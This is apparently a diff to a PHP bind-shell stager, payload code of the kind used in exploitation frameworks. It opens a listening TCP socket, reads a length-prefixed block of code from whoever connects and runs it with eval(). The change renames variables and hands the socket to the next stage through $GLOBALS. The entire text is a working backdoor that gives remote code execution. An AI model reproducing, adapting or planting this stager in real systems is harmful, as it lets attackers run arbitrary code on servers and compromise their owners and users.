@@ -8,27 +8,27 @@ $ipaddr = "0.0.0.0";
 if (is_callable('stream_socket_server')) {
 	$srvsock = stream_socket_server("tcp://{$ipaddr}:{$port}");
 	if (!$srvsock) { die(); }
-	$msgsock = stream_socket_accept($srvsock, -1);
-	$msgsock_type = 'stream';
+	$s = stream_socket_accept($srvsock, -1);
+	$s_type = 'stream';
 } elseif (is_callable('socket_create_listen')) {
 	$srvsock = socket_create_listen(AF_INET, SOCK_STREAM, SOL_TCP);
 	if (!$res) { die(); }
-	$msgsock = socket_accept($srvsock);
-	$msgsock_type = 'socket';
+	$s = socket_accept($srvsock);
+	$s_type = 'socket';
 } elseif (is_callable('socket_create')) {
 	$srvsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
 	$res = socket_bind($srvsock, $ipaddr, $port);
 	if (!$res) { die(); }
-	$msgsock = socket_accept($srvsock);
-	$msgsock_type = 'socket';
+	$s = socket_accept($srvsock);
+	$s_type = 'socket';
 } else {
 	die();
 }
-if (!$msgsock) { die(); }
+if (!$s) { die(); }
 
-switch ($msgsock_type) { 
-case 'stream': $len = fread($msgsock, 4); break;
-case 'socket': $len = socket_read($msgsock, 4); break;
+switch ($s_type) { 
+case 'stream': $len = fread($s, 4); break;
+case 'socket': $len = socket_read($s, 4); break;
 }
 if (!$len) {
 	# We failed on the main socket.  There's no way to continue, so
@@ -38,13 +38,16 @@ if (!$len) {
 $a = unpack("Nlen", $len);
 $len = $a['len'];
 
-$buffer = '';
-while (strlen($buffer) < $len) {
-	switch ($msgsock_type) { 
-	case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;
-	case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer)); break;
+$b = '';
+while (strlen($b) < $len) {
+	switch ($s_type) { 
+	case 'stream': $b .= fread($s, $len-strlen($b)); break;
+	case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
 	}
 }
 
-eval($buffer);
+# Set up the socket for the main stage to use.
+$GLOBALS['msgsock'] = $s;
+$GLOBALS['msgsock_type'] = $s_type;
+eval($b);
 die();
